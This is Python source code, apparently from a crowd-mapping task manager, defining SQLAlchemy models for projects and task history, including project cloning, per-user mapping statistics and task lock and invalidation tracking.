        cloned_project.created = timestamp()
        cloned_project.author_id = author_id
        cloned_project.status = ProjectStatus.DRAFT.value
        cloned_project.id = None  # Reset ID so we get a new ID when inserted
        cloned_project.geometry = None
        cloned_project.centroid = None

        db.session.add(cloned_project)
        db.session.commit()

        # Now add the project info, we have to do it in a two stage commit because we need to know the new project id
        original_project = Project.get(project_id)

        for info in original_project.project_info:
            db.session.expunge(info)
            make_transient(info)  # Must remove the object from the session or it will be updated rather than inserted
            info.id = None
            info.project_id_str = str(cloned_project.id)
            cloned_project.project_info.append(info)

        # Now add allowed users now we know new project id, if there are any
        for user in original_project.allowed_users:
            cloned_project.allowed_users.append(user)

        # Add other project metadata
        cloned_project.priority = original_project.priority
        cloned_project.default_locale = original_project.default_locale
        cloned_project.mapper_level = original_project.mapper_level
        cloned_project.enforce_mapper_level = original_project.enforce_mapper_level
        cloned_project.enforce_validator_role = original_project.enforce_validator_role
        cloned_project.enforce_random_task_selection = original_project.enforce_random_task_selection
        cloned_project.private = original_project.private
        cloned_project.entities_to_map = original_project.entities_to_map
        cloned_project.due_date = original_project.due_date
        cloned_project.imagery = original_project.imagery
        cloned_project.josm_preset = original_project.josm_preset
        cloned_project.license_id = original_project.license_id
        cloned_project.mapping_types = original_project.mapping_types
        cloned_project.organisation_tag = original_project.organisation_tag
        cloned_project.campaign_tag = original_project.campaign_tag

        # We try to remove the changeset comment referencing the old project. This
        #  assumes the default changeset comment has not changed between the old
        #  project and the cloned. This is a best effort basis.
        default_comment = current_app.config['DEFAULT_CHANGESET_COMMENT']
        changeset_comments = []
        if original_project.changeset_comment is not None:
            changeset_comments = original_project.changeset_comment.split(' ')
        if f'{default_comment}-{original_project.id}' in changeset_comments:
            changeset_comments.remove(f'{default_comment}-{original_project.id}')
        cloned_project.changeset_comment = "" "".join(changeset_comments)

        db.session.add(cloned_project)
        db.session.commit()

        return cloned_project

    @staticmethod
    def get(project_id: int):
        """"""
        Gets specified project
        :param project_id: project ID in scope
        :return: Project if found otherwise None
        """"""
        return Project.query.get(project_id)

    def update(self, project_dto: ProjectDTO):
        """""" Updates project from DTO """"""
        self.status = ProjectStatus[project_dto.project_status].value
        self.priority = ProjectPriority[project_dto.project_priority].value
        self.default_locale = project_dto.default_locale
        self.enforce_mapper_level = project_dto.enforce_mapper_level
        self.enforce_validator_role = project_dto.enforce_validator_role
        self.enforce_random_task_selection = project_dto.enforce_random_task_selection
        self.allow_non_beginners = project_dto.allow_non_beginners
        self.private = project_dto.private
        self.mapper_level = MappingLevel[project_dto.mapper_level.upper()].value
        self.entities_to_map = project_dto.entities_to_map
        self.changeset_comment = project_dto.changeset_comment
        self.due_date = project_dto.due_date
        self.imagery = project_dto.imagery
        self.josm_preset = project_dto.josm_preset
        self.last_updated = timestamp()
        self.license_id = project_dto.license_id

        if project_dto.osmcha_filter_id:
            # Support simple extraction of OSMCha filter id from OSMCha URL
            match = re.search('aoi=([\w-]+)', project_dto.osmcha_filter_id)
            self.osmcha_filter_id = match.group(1) if match else project_dto.osmcha_filter_id
        else:
            self.osmcha_filter_id = None

        if project_dto.organisation_tag:
            org_tag = Tags.upsert_organistion_tag(project_dto.organisation_tag)
            self.organisation_tag = org_tag
        else:
            self.organisation_tag = None  # Set to none, for cases where a tag could have been removed

        if project_dto.campaign_tag:
            camp_tag = Tags.upsert_campaign_tag(project_dto.campaign_tag)
            self.campaign_tag = camp_tag
        else:
            self.campaign_tag = None  # Set to none, for cases where a tag could have been removed

        # Cast MappingType strings to int array
        type_array = []
        for mapping_type in project_dto.mapping_types:
            type_array.append(MappingTypes[mapping_type].value)
        self.mapping_types = type_array

        # Cast Editor strings to int array
        mapping_editors_array = []
        for mapping_editor in project_dto.mapping_editors:
            mapping_editors_array.append(Editors[mapping_editor].value)
        self.mapping_editors = mapping_editors_array

        validation_editors_array = []
        for validation_editor in project_dto.validation_editors:
            validation_editors_array.append(Editors[validation_editor].value)
        self.validation_editors = validation_editors_array

        # Add list of allowed users, meaning the project can only be mapped by users in this list
        if hasattr(project_dto, 'allowed_users'):
            self.allowed_users = []  # Clear existing relationships then re-insert
            for user in project_dto.allowed_users:
                self.allowed_users.append(user)

        # Set Project Info for all returned locales
        for dto in project_dto.project_info_locales:

            project_info = self.project_info.filter_by(locale=dto.locale).one_or_none()

            if project_info is None:
                new_info = ProjectInfo.create_from_dto(dto)  # Can't find info so must be new locale
                self.project_info.append(new_info)
            else:
                project_info.update_from_dto(dto)

        self.priority_areas = []  # Always clear Priority Area prior to updating
        if project_dto.priority_areas:
            for priority_area in project_dto.priority_areas:
                pa = PriorityArea.from_dict(priority_area)
                self.priority_areas.append(pa)

        db.session.commit()

    def delete(self):
        """""" Deletes the current model from the DB """"""
        db.session.delete(self)
        db.session.commit()

    def can_be_deleted(self) -> bool:
        """""" Projects can be deleted if they have no mapped work """"""
        task_count = self.tasks.filter(Task.task_status != TaskStatus.READY.value).count()
        if task_count == 0:
            return True
        else:
            return False

    def get_locked_tasks_for_user(self, user_id: int):
        """""" Gets tasks on project owned by specified user id""""""
        tasks = self.tasks.filter_by(locked_by=user_id)

        locked_tasks = []
        for task in tasks:
            locked_tasks.append(task.id)

        return locked_tasks

    def get_locked_tasks_details_for_user(self, user_id: int):
        """""" Gets tasks on project owned by specified user id""""""
        tasks = self.tasks.filter_by(locked_by=user_id)

        locked_tasks = []
        for task in tasks:
            locked_tasks.append(task)

        return locked_tasks

    @staticmethod
    def get_projects_for_admin(admin_id: int, preferred_locale: str) -> PMDashboardDTO:
        """""" Get projects for admin """"""
        admins_projects = Project.query.filter_by(author_id=admin_id).all()

        if admins_projects is None:
            raise NotFound('No projects found for admin')

        admin_projects_dto = PMDashboardDTO()
        for project in admins_projects:
            pm_project = project.get_project_summary(preferred_locale)
            project_status = ProjectStatus(project.status)

            if project_status == ProjectStatus.DRAFT:
                admin_projects_dto.draft_projects.append(pm_project)
            elif project_status == ProjectStatus.PUBLISHED:
                admin_projects_dto.active_projects.append(pm_project)
            elif project_status == ProjectStatus.ARCHIVED:
                admin_projects_dto.archived_projects.append(pm_project)
            else:
                current_app.logger.error(f'Unexpected state project {project.id}')

        return admin_projects_dto

    def get_project_user_stats(self, user_id: int) -> ProjectUserStatsDTO:
        """"""Compute project specific stats for a given user""""""
        stats_dto = ProjectUserStatsDTO()
        stats_dto.time_spent_mapping = 0
        stats_dto.time_spent_validating = 0
        stats_dto.total_time_spent = 0

        query = """"""SELECT SUM(TO_TIMESTAMP(action_text, 'HH24:MI:SS')::TIME) FROM task_history
                   WHERE action='LOCKED_FOR_MAPPING'
                   and user_id = :user_id and project_id = :project_id;""""""
        total_mapping_time = db.engine.execute(text(query), user_id=user_id, project_id=self.id)
        for time in total_mapping_time:
            total_mapping_time = time[0]
            if total_mapping_time:
                stats_dto.time_spent_mapping = total_mapping_time.total_seconds()
                stats_dto.total_time_spent += stats_dto.time_spent_mapping

        query = """"""SELECT SUM(TO_TIMESTAMP(action_text, 'HH24:MI:SS')::TIME) FROM task_history
                   WHERE action='LOCKED_FOR_VALIDATION'
                   and user_id = :user_id and project_id = :project_id;""""""
        total_validation_time = db.engine.execute(text(query), user_id=user_id, project_id=self.id)
        for time in total_validation_time:
            total_validation_time = time[0]
            if total_validation_time:
                stats_dto.time_spent_validating = total_validation_time.total_seconds()
                stats_dto.total_time_spent += stats_dto.time_spent_validating

        return stats_dto

    def get_project_stats(self) -> ProjectStatsDTO:
        """""" Create Project Summary model for postgis project object""""""
        project_stats = ProjectStatsDTO()
        project_stats.project_id = self.id
        polygon = to_shape(self.geometry)
        polygon_aea = transform(
                            partial(
                            pyproj.transform,
                            pyproj.Proj(init='EPSG:4326'),
                            pyproj.Proj(
                                proj='aea',
                                lat1=polygon.bounds[1],
                                lat2=polygon.bounds[3])),
                            polygon)
        area = polygon_aea.area/1000000
        project_stats.area = area
        project_stats.total_mappers = db.session.query(User).filter(User.projects_mapped.any(self.id)).count()
        project_stats.total_tasks = self.total_tasks
        project_stats.total_comments = db.session.query(ProjectChat).filter(ProjectChat.project_id == self.id).count()
        project_stats.percent_mapped = Project.calculate_tasks_percent('mapped', self.total_tasks,
                                                                       self.tasks_mapped, self.tasks_validated,
                                                                       self.tasks_bad_imagery)
        project_stats.percent_validated = Project.calculate_tasks_percent('validated', self.total_tasks,
                                                                          self.tasks_mapped, self.tasks_validated,
                                                                          self.tasks_bad_imagery)
        project_stats.percent_bad_imagery = Project.calculate_tasks_percent('bad_imagery', self.total_tasks,
                                                                            self.tasks_mapped, self.tasks_validated,
                                                                            self.tasks_bad_imagery)
        centroid_geojson = db.session.scalar(self.centroid.ST_AsGeoJSON())
        project_stats.aoi_centroid = geojson.loads(centroid_geojson)
        unique_mappers = TaskHistory.query.filter(
                TaskHistory.action == 'LOCKED_FOR_MAPPING',
                TaskHistory.project_id == self.id
            ).distinct(TaskHistory.user_id).count()
        unique_validators = TaskHistory.query.filter(
                TaskHistory.action == 'LOCKED_FOR_VALIDATION',
                TaskHistory.project_id == self.id
            ).distinct(TaskHistory.user_id).count()
        project_stats.total_time_spent = 0
        project_stats.total_mapping_time = 0
        project_stats.total_validation_time = 0
        project_stats.average_mapping_time = 0
        project_stats.average_validation_time = 0

        query = """"""SELECT SUM(TO_TIMESTAMP(action_text, 'HH24:MI:SS')::TIME) FROM task_history
                   WHERE action='LOCKED_FOR_MAPPING' and project_id = :project_id;""""""
        total_mapping_time = db.engine.execute(text(query), project_id=self.id)
        for row in total_mapping_time:
            total_mapping_time = row[0]
            if total_mapping_time:
                total_mapping_seconds = total_mapping_time.total_seconds()
                project_stats.total_mapping_time = total_mapping_seconds
                project_stats.total_time_spent += project_stats.total_mapping_time
                if unique_mappers:
                    average_mapping_time = total_mapping_seconds/unique_mappers
                    project_stats.average_mapping_time = average_mapping_time

        query = """"""SELECT SUM(TO_TIMESTAMP(action_text, 'HH24:MI:SS')::TIME) FROM task_history
                   WHERE action='LOCKED_FOR_VALIDATION' and project_id = :project_id;""""""
        total_validation_time = db.engine.execute(text(query), project_id=self.id)
        for row in total_validation_time:
            total_validation_time = row[0]
            if total_validation_time:
                total_validation_seconds = total_validation_time.total_seconds()
                project_stats.total_validation_time = total_validation_seconds
                project_stats.total_time_spent += project_stats.total_validation_time
                if unique_validators:
                    average_validation_time = total_validation_seconds/unique_validators
                    project_stats.average_validation_time = average_validation_time

        return project_stats

    def get_project_summary(self, preferred_locale) -> ProjectSummary:
        """""" Create Project Summary model for postgis project object""""""
        summary = ProjectSummary()
        summary.project_id = self.id
        priority = self.priority
        if priority == 0:
            summary.priority = 'URGENT'
        elif priority == 1:
            summary.priority = 'HIGH'
        elif priority == 2:
            summary.priority = 'MEDIUM'
        else:
            summary.priority = 'LOW'
        summary.author = User().get_by_id(self.author_id).username
        polygon = to_shape(self.geometry)
        polygon_aea = transform(
                            partial(
                            pyproj.transform,
                            pyproj.Proj(init='EPSG:4326'),
                            pyproj.Proj(
                                proj='aea',
                                lat1=polygon.bounds[1],
                                lat2=polygon.bounds[3])),
                            polygon)
        area = polygon_aea.area/1000000
        summary.area = area
        summary.campaign_tag = self.campaign_tag
        summary.changeset_comment = self.changeset_comment
        summary.created = self.created
        summary.last_updated = self.last_updated
        summary.due_date = self.due_date
        summary.mapper_level = MappingLevel(self.mapper_level).name
        summary.mapper_level_enforced = self.enforce_mapper_level
        summary.validator_level_enforced = self.enforce_validator_role
        summary.organisation_tag = self.organisation_tag
        summary.status = ProjectStatus(self.status).name
        summary.entities_to_map = self.entities_to_map

        centroid_geojson = db.session.scalar(self.centroid.ST_AsGeoJSON())
        summary.aoi_centroid = geojson.loads(centroid_geojson)

        summary.percent_mapped = Project.calculate_tasks_percent('mapped', self.total_tasks,
                                                                 self.tasks_mapped, self.tasks_validated,
                                                                 self.tasks_bad_imagery)
        summary.percent_validated = Project.calculate_tasks_percent('validated', self.total_tasks,
                                                                    self.tasks_mapped, self.tasks_validated,
                                                                    self.tasks_bad_imagery)
        summary.percent_bad_imagery = Project.calculate_tasks_percent('bad_imagery', self.total_tasks,
                                                                      self.tasks_mapped, self.tasks_validated,
                                                                      self.tasks_bad_imagery)

        project_info = ProjectInfo.get_dto_for_locale(self.id, preferred_locale, self.default_locale)
        summary.name = project_info.name
        summary.short_description = project_info.short_description

        return summary

    def get_project_title(self, preferred_locale):
        project_info = ProjectInfo.get_dto_for_locale(self.id, preferred_locale, self.default_locale)
        return project_info.name

    def get_aoi_geometry_as_geojson(self):
        """""" Helper which returns the AOI geometry as a geojson object """"""
        aoi_geojson = db.engine.execute(self.geometry.ST_AsGeoJSON()).scalar()
        return geojson.loads(aoi_geojson)

    @staticmethod
    @cached(active_mappers_cache)
    def get_active_mappers(project_id) -> int:
        """""" Get count of Locked tasks as a proxy for users who are currently active on the project """"""

        return Task.query \
            .filter(Task.task_status.in_((TaskStatus.LOCKED_FOR_MAPPING.value,
                    TaskStatus.LOCKED_FOR_VALIDATION.value))) \
            .filter(Task.project_id == project_id) \
            .distinct(Task.locked_by) \
            .count()

    def _get_project_and_base_dto(self):
        """""" Populates a project DTO with properties common to all roles """"""
        base_dto = ProjectDTO()
        base_dto.project_id = self.id
        base_dto.project_status = ProjectStatus(self.status).name
        base_dto.default_locale = self.default_locale
        base_dto.project_priority = ProjectPriority(self.priority).name
        base_dto.area_of_interest = self.get_aoi_geometry_as_geojson()
        base_dto.aoi_bbox = shape(base_dto.area_of_interest).bounds
        base_dto.enforce_mapper_level = self.enforce_mapper_level
        base_dto.enforce_validator_role = self.enforce_validator_role
        base_dto.enforce_random_task_selection = self.enforce_random_task_selection
        base_dto.allow_non_beginners = self.allow_non_beginners
        base_dto.private = self.private
        base_dto.mapper_level = MappingLevel(self.mapper_level).name
        base_dto.entities_to_map = self.entities_to_map
        base_dto.changeset_comment = self.changeset_comment
        base_dto.osmcha_filter_id = self.osmcha_filter_id
        base_dto.due_date = self.due_date
        base_dto.imagery = self.imagery
        base_dto.josm_preset = self.josm_preset
        base_dto.campaign_tag = self.campaign_tag
        base_dto.organisation_tag = self.organisation_tag
        base_dto.license_id = self.license_id
        base_dto.created = self.created
        base_dto.last_updated = self.last_updated
        base_dto.author = User().get_by_id(self.author_id).username
        base_dto.active_mappers = Project.get_active_mappers(self.id)
        base_dto.task_creation_mode = TaskCreationMode(self.task_creation_mode).name

        if self.private:
            # If project is private it should have a list of allowed users
            allowed_usernames = []
            for user in self.allowed_users:
                allowed_usernames.append(user.username)
            base_dto.allowed_usernames = allowed_usernames

        if self.mapping_types:
            mapping_types = []
            for mapping_type in self.mapping_types:
                mapping_types.append(MappingTypes(mapping_type).name)

            base_dto.mapping_types = mapping_types

        if self.mapping_editors:
            mapping_editors = []
            for mapping_editor in self.mapping_editors:
                mapping_editors.append(Editors(mapping_editor).name)

            base_dto.mapping_editors = mapping_editors

        if self.validation_editors:
            validation_editors = []
            for validation_editor in self.validation_editors:
                validation_editors.append(Editors(validation_editor).name)

            base_dto.validation_editors = validation_editors

        if self.priority_areas:
            geojson_areas = []
            for priority_area in self.priority_areas:
                geojson_areas.append(priority_area.get_as_geojson())

            base_dto.priority_areas = geojson_areas

        return self, base_dto

    def as_dto_for_mapping(self, locale: str, abbrev: bool) -> Optional[ProjectDTO]:
        """""" Creates a Project DTO suitable for transmitting to mapper users """"""
        project, project_dto = self._get_project_and_base_dto()

        if abbrev == False:
            project_dto.tasks = Task.get_tasks_as_geojson_feature_collection(self.id)
        else:
            project_dto.tasks = Task.get_tasks_as_geojson_feature_collection_no_geom(self.id)
        project_dto.project_info = ProjectInfo.get_dto_for_locale(self.id, locale, project.default_locale)

        return project_dto

    def all_tasks_as_geojson(self):
        """""" Creates a geojson of all areas """"""
        project_tasks = Task.get_tasks_as_geojson_feature_collection(self.id)

        return project_tasks

    @staticmethod
    def get_all_organisations_tag(preferred_locale='en'):
        query = db.session.query(Project.id,
                                 Project.organisation_tag,
                                 Project.private,
                                 Project.status)\
            .join(ProjectInfo)\
            .filter(ProjectInfo.locale.in_([preferred_locale, 'en'])) \
            .filter(Project.private != True)\
            .filter(Project.organisation_tag.isnot(None))\
            .filter(Project.organisation_tag != '')
        query = query.distinct(Project.organisation_tag)
        query = query.order_by(Project.organisation_tag)
        tags_dto = TagsDTO()
        tags_dto.tags = [r[1] for r in query]
        return tags_dto

    @staticmethod
    def get_all_campaign_tag(preferred_locale='en'):
        query = db.session.query(Project.id,
                                 Project.campaign_tag,
                                 Project.private,
                                 Project.status)\
            .join(ProjectInfo)\
            .filter(ProjectInfo.locale.in_([preferred_locale, 'en'])) \
            .filter(Project.private != True)\
            .filter(Project.campaign_tag.isnot(None))\
            .filter(Project.campaign_tag != '')
        query = query.distinct(Project.campaign_tag)
        query = query.order_by(Project.campaign_tag)
        tags_dto = TagsDTO()
        tags_dto.tags = [r[1] for r in query]
        return tags_dto

    @staticmethod
    def calculate_tasks_percent(target, total_tasks, tasks_mapped, tasks_validated, tasks_bad_imagery):
        """""" Calculates percentages of contributions """"""
        if target == 'mapped':
            return int((tasks_mapped + tasks_validated) / (total_tasks - tasks_bad_imagery) * 100)
        elif target == 'validated':
            return int(tasks_validated / (total_tasks - tasks_bad_imagery) * 100)
        elif target == 'bad_imagery':
            return int((tasks_bad_imagery / total_tasks) * 100)

    def as_dto_for_admin(self, project_id):
        """""" Creates a Project DTO suitable for transmitting to project admins """"""
        project, project_dto = self._get_project_and_base_dto()

        if project is None:
            return None

        project_dto.project_info_locales = ProjectInfo.get_dto_for_all_locales(project_id)

        return project_dto


# Add index on project geometry
db.Index('idx_geometry', Project.geometry, postgresql_using='gist')
/n/n/nserver/models/postgis/task.py/n/nimport bleach
import datetime
import geojson
import json
from enum import Enum
from flask import current_app
from sqlalchemy import text
from sqlalchemy.orm.exc import NoResultFound, MultipleResultsFound
from sqlalchemy.orm.session import make_transient
from geoalchemy2 import Geometry
from server import db
from typing import List
from server.models.dtos.mapping_dto import TaskDTO, TaskHistoryDTO
from server.models.dtos.task_annotation_dto import TaskAnnotationDTO 
from server.models.dtos.validator_dto import MappedTasksByUser, MappedTasks, InvalidatedTask, InvalidatedTasks
from server.models.dtos.project_dto import ProjectComment, ProjectCommentsDTO
from server.models.dtos.mapping_issues_dto import TaskMappingIssueDTO
from server.models.postgis.statuses import TaskStatus, MappingLevel
from server.models.postgis.user import User
from server.models.postgis.utils import InvalidData, InvalidGeoJson, ST_GeomFromGeoJSON, ST_SetSRID, timestamp, parse_duration, NotFound
from server.models.postgis.task_annotation import TaskAnnotation


class TaskAction(Enum):
    """""" Describes the possible actions that can happen to to a task, that we'll record history for """"""
    LOCKED_FOR_MAPPING = 1
    LOCKED_FOR_VALIDATION = 2
    STATE_CHANGE = 3
    COMMENT = 4
    AUTO_UNLOCKED_FOR_MAPPING = 5
    AUTO_UNLOCKED_FOR_VALIDATION = 6


class TaskInvalidationHistory(db.Model):
    """""" Describes the most recent history of task invalidation and subsequent validation """"""
    __tablename__ = ""task_invalidation_history""
    id = db.Column(db.Integer, primary_key=True)
    project_id = db.Column(db.Integer, db.ForeignKey('projects.id'), nullable=False)
    task_id = db.Column(db.Integer, nullable=False)
    is_closed = db.Column(db.Boolean, default=False)
    mapper_id = db.Column(db.BigInteger, db.ForeignKey('users.id', name='fk_mappers'))
    mapped_date = db.Column(db.DateTime)
    invalidator_id = db.Column(db.BigInteger, db.ForeignKey('users.id', name='fk_invalidators'))
    invalidated_date = db.Column(db.DateTime)
    invalidation_history_id = db.Column(db.Integer, db.ForeignKey('task_history.id', name='fk_invalidation_history'))
    validator_id = db.Column(db.BigInteger, db.ForeignKey('users.id', name='fk_validators'))
    validated_date = db.Column(db.DateTime)
    updated_date = db.Column(db.DateTime, default=timestamp)

    __table_args__ = (db.ForeignKeyConstraint([task_id, project_id], ['tasks.id', 'tasks.project_id'], name='fk_tasks'),
                      db.Index('idx_task_validation_history_composite', 'task_id', 'project_id'),
                      db.Index('idx_task_validation_mapper_status_composite', 'invalidator_id', 'is_closed'),
                      db.Index('idx_task_validation_mapper_status_composite', 'mapper_id', 'is_closed'),
                      {})

    def __init__(self, project_id, task_id):
        self.project_id = project_id
        self.task_id = task_id
        self.is_closed = False

    def delete(self):
        """""" Deletes the current model from the DB """"""
        db.session.delete(self)
        db.session.commit()

    @staticmethod
    def get_open_for_task(project_id, task_id):
        return TaskInvalidationHistory.query.filter_by(task_id=task_id, project_id=project_id, is_closed=False).one_or_none()

    @staticmethod
    def close_all_for_task(project_id, task_id):
        TaskInvalidationHistory.query.filter_by(task_id=task_id, project_id=project_id, is_closed=False) \
                               .update({""is_closed"": True})

    @staticmethod
    def record_invalidation(project_id, task_id, invalidator_id, history):
        # Invalidation always kicks off a new entry for a task, so close any existing ones.
        TaskInvalidationHistory.close_all_for_task(project_id, task_id)

        last_mapped = TaskHistory.get_last_mapped_action(project_id, task_id)
        if last_mapped is None:
            return

        entry = TaskInvalidationHistory(project_id, task_id)
        entry.invalidation_history_id = history.id
        entry.mapper_id = last_mapped.user_id
        entry.mapped_date = last_mapped.action_date
        entry.invalidator_id = invalidator_id
        entry.invalidated_date = history.action_date
        entry.updated_date = timestamp()
        db.session.add(entry)

    @staticmethod
    def record_validation(project_id, task_id, validator_id, history):
        entry = TaskInvalidationHistory.get_open_for_task(project_id, task_id)

        # If no open invalidation to update, then nothing to do
        if entry is None:
            return

        last_mapped = TaskHistory.get_last_mapped_action(project_id, task_id)
        entry.mapper_id = last_mapped.user_id
        entry.mapped_date = last_mapped.action_date
        entry.validator_id = validator_id
        entry.validated_date = history.action_date
        entry.is_closed = True
        entry.updated_date = timestamp()


class TaskMappingIssue(db.Model):
    """""" Describes an issue (along with an occurrence count) with a task mapping that contributed to invalidation of the task """"""
    __tablename__ = ""task_mapping_issues""
    id = db.Column(db.Integer, primary_key=True)
    task_history_id = db.Column(db.Integer, db.ForeignKey('task_history.id'), nullable=False, index=True)
    issue = db.Column(db.String, nullable=False)
    mapping_issue_category_id = db.Column(db.Integer, db.ForeignKey('mapping_issue_categories.id', name='fk_issue_category'), nullable=False)
    count = db.Column(db.Integer, nullable=False)

    def __init__(self, issue, count, mapping_issue_category_id, task_history_id=None):
        self.task_history_id = task_history_id
        self.issue = issue
        self.count = count
        self.mapping_issue_category_id = mapping_issue_category_id

    def delete(self):
        """""" Deletes the current model from the DB """"""
        db.session.delete(self)
        db.session.commit()

    def as_dto(self):
        issue_dto = TaskMappingIssueDTO()
        issue_dto.category_id = self.mapping_issue_category_id
        issue_dto.name = self.issue
        issue_dto.count = self.count
        return issue_dto

    def __repr__(self):
        return ""{0}: {1}"".format(self.issue, self.count)


class TaskHistory(db.Model):
    """""" Describes the history associated with a task """"""
    __tablename__ = ""task_history""

    id = db.Column(db.Integer, primary_key=True)
    project_id = db.Column(db.Integer, db.ForeignKey('projects.id'), index=True)
    task_id = db.Column(db.Integer, nullable=False)
    action = db.Column(db.String, nullable=False)
    action_text = db.Column(db.String)
    action_date = db.Column(db.DateTime, nullable=False, default=timestamp)
    user_id = db.Column(db.BigInteger, db.ForeignKey('users.id', name='fk_users'), nullable=False)
    invalidation_history = db.relationship(TaskInvalidationHistory, lazy='dynamic', cascade='all')

    actioned_by = db.relationship(User)
    task_mapping_issues = db.relationship(TaskMappingIssue, cascade=""all"")

    __table_args__ = (db.ForeignKeyConstraint([task_id, project_id], ['tasks.id', 'tasks.project_id'], name='fk_tasks'),
                      db.Index('idx_task_history_composite', 'task_id', 'project_id'), {})

    def __init__(self, task_id, project_id, user_id):
        self.task_id = task_id
        self.project_id = project_id
        self.user_id = user_id

    def set_task_locked_action(self, task_action: TaskAction):
        if task_action not in [TaskAction.LOCKED_FOR_MAPPING, TaskAction.LOCKED_FOR_VALIDATION]:
            raise ValueError('Invalid Action')

        self.action = task_action.name

    def set_comment_action(self, comment):
        self.action = TaskAction.COMMENT.name
        clean_comment = bleach.clean(comment)  # Bleach input to ensure no nefarious script tags etc
        self.action_text = clean_comment

    def set_state_change_action(self, new_state):
        self.action = TaskAction.STATE_CHANGE.name
        self.action_text = new_state.name

    def set_auto_unlock_action(self, task_action: TaskAction):
        self.action = task_action.name

    def delete(self):
        """""" Deletes the current model from the DB """"""
        db.session.delete(self)
        db.session.commit()

    @staticmethod
    def update_task_locked_with_duration(task_id: int, project_id: int, lock_action: TaskStatus, user_id: int):
        """"""
        Calculates the duration a task was locked for and sets it on the history record
        :param task_id: Task in scope
        :param project_id: Project ID in scope
        :param lock_action: The lock action, either Mapping or Validation
        :param user_id: Logged in user updating the task
        :return:
        """"""
        try:
            last_locked = TaskHistory.query.filter_by(task_id=task_id, project_id=project_id, action=lock_action.name,
                                                      action_text=None, user_id=user_id).one()
        except NoResultFound:
            # We suspect there's some kind or race condition that is occasionally deleting history records
            # prior to user unlocking task. Most likely stemming from auto-unlock feature. However, given that
            # we're trying to update a row that doesn't exist, it's better to return without doing anything
            # rather than showing the user an error that they can't fix
            return
        except MultipleResultsFound:
            # Again race conditions may mean we have multiple rows within the Task History.  Here we attempt to
            # remove the oldest duplicate rows, and update the newest on the basis that this was the last action
            # the user was attempting to make.
            TaskHistory.remove_duplicate_task_history_rows(task_id, project_id, lock_action, user_id)

            # Now duplicate is removed, we recursively call ourself to update the duration on the remaining row
            TaskHistory.update_task_locked_with_duration(task_id, project_id, lock_action, user_id)
            return

        duration_task_locked = datetime.datetime.utcnow() - last_locked.action_date
        # Cast duration to isoformat for later transmission via api
        last_locked.action_text = (datetime.datetime.min + duration_task_locked).time().isoformat()
        db.session.commit()

    @staticmethod
    def remove_duplicate_task_history_rows(task_id: int, project_id: int, lock_action: TaskStatus, user_id: int):
        """""" Method used in rare cases where we have duplicate task history records for a given action by a user
            This method will remove the oldest duplicate record, on the basis that the newest record was the
            last action the user was attempting to perform
        """"""
        dupe = TaskHistory.query.filter(TaskHistory.project_id == project_id,
                                        TaskHistory.task_id == task_id,
                                        TaskHistory.action == lock_action.name,
                                        TaskHistory.user_id == user_id).order_by(TaskHistory.id.asc()).first()

        dupe.delete()

    @staticmethod
    def update_expired_and_locked_actions(project_id: int, task_id: int, expiry_date: datetime, action_text: str):
        """"""
        Sets auto unlock state to all not finished actions, that are older then the expiry date.
        Action is considered as a not finished, when it is in locked state and doesn't have action text
        :param project_id: Project ID in scope
        :param task_id: Task in scope
        :param expiry_date: Action created before this date is treated as expired
        :param action_text: Text which will be set for all changed actions
        :return:
        """"""
        all_expired = TaskHistory.query.filter(
            TaskHistory.task_id == task_id,
            TaskHistory.project_id == project_id,
            TaskHistory.action_text.is_(None),
            TaskHistory.action.in_([TaskAction.LOCKED_FOR_VALIDATION.name, TaskAction.LOCKED_FOR_MAPPING.name]),
            TaskHistory.action_date <= expiry_date).all()

        for task_history in all_expired:
            unlock_action = TaskAction.AUTO_UNLOCKED_FOR_MAPPING if task_history.action == 'LOCKED_FOR_MAPPING' \
                else TaskAction.AUTO_UNLOCKED_FOR_VALIDATION

            task_history.set_auto_unlock_action(unlock_action)
            task_history.action_text = action_text

        db.session.commit()

    @staticmethod
    def get_all_comments(project_id: int) -> ProjectCommentsDTO:
        """""" Gets all comments for the supplied project_id""""""

        comments = db.session.query(TaskHistory.task_id,
                                    TaskHistory.action_date,
                                    TaskHistory.action_text,
                                    User.username) \
            .join(User) \
            .filter(TaskHistory.project_id == project_id, TaskHistory.action == TaskAction.COMMENT.name).all()

        comments_dto = ProjectCommentsDTO()
        for comment in comments:
            dto = ProjectComment()
            dto.comment = comment.action_text
            dto.comment_date = comment.action_date
            dto.user_name = comment.username
            dto.task_id = comment.task_id
            comments_dto.comments.append(dto)

        return comments_dto

    @staticmethod
    def get_last_status(project_id: int, task_id: int, for_undo: bool = False):
        """""" Get the status the task was set to the last time the task had a STATUS_CHANGE""""""
        result = db.session.query(TaskHistory.action_text) \
            .filter(TaskHistory.project_id == project_id,
                    TaskHistory.task_id == task_id,
                    TaskHistory.action == TaskAction.STATE_CHANGE.name) \
            .order_by(TaskHistory.action_date.desc()).all()

        if not result:
            return TaskStatus.READY  # No result so default to ready status

        if len(result) == 1 and for_undo:
            # We're looking for the previous status, however, there isn't any so we'll return Ready
            return TaskStatus.READY

        if for_undo and result[0][0] in [TaskStatus.MAPPED.name, TaskStatus.BADIMAGERY.name]:
            # We need to return a READY when last status of the task is badimagery or mapped.
            return TaskStatus.READY

        if for_undo:
            # Return the second last status which was status the task was previously set to
            return TaskStatus[result[1][0]]
        else:
            return TaskStatus[result[0][0]]

    @staticmethod
    def get_last_action(project_id: int, task_id: int):
        """"""Gets the most recent task history record for the task""""""
        return TaskHistory.query.filter(TaskHistory.project_id == project_id,
                                        TaskHistory.task_id == task_id) \
            .order_by(TaskHistory.action_date.desc()).first()

    @staticmethod
    def get_last_action_of_type(project_id: int, task_id: int, allowed_task_actions: list):
        """"""Gets the most recent task history record having provided TaskAction""""""
        return TaskHistory.query.filter(TaskHistory.project_id == project_id,
                                        TaskHistory.task_id == task_id,
                                        TaskHistory.action.in_(allowed_task_actions)) \
            .order_by(TaskHistory.action_date.desc()).first()

    @staticmethod
    def get_last_locked_action(project_id: int, task_id: int):
        """"""Gets the most recent task history record with locked action for the task""""""
        return TaskHistory.get_last_action_of_type(
            project_id, task_id,
            [TaskAction.LOCKED_FOR_MAPPING.name, TaskAction.LOCKED_FOR_VALIDATION.name])

    @staticmethod
    def get_last_locked_or_auto_unlocked_action(project_id: int, task_id: int):
        """"""Gets the most recent task history record with locked or auto unlocked action for the task""""""
        return TaskHistory.get_last_action_of_type(
            project_id, task_id,
            [TaskAction.LOCKED_FOR_MAPPING.name, TaskAction.LOCKED_FOR_VALIDATION.name,
             TaskAction.AUTO_UNLOCKED_FOR_MAPPING.name, TaskAction.AUTO_UNLOCKED_FOR_VALIDATION.name])

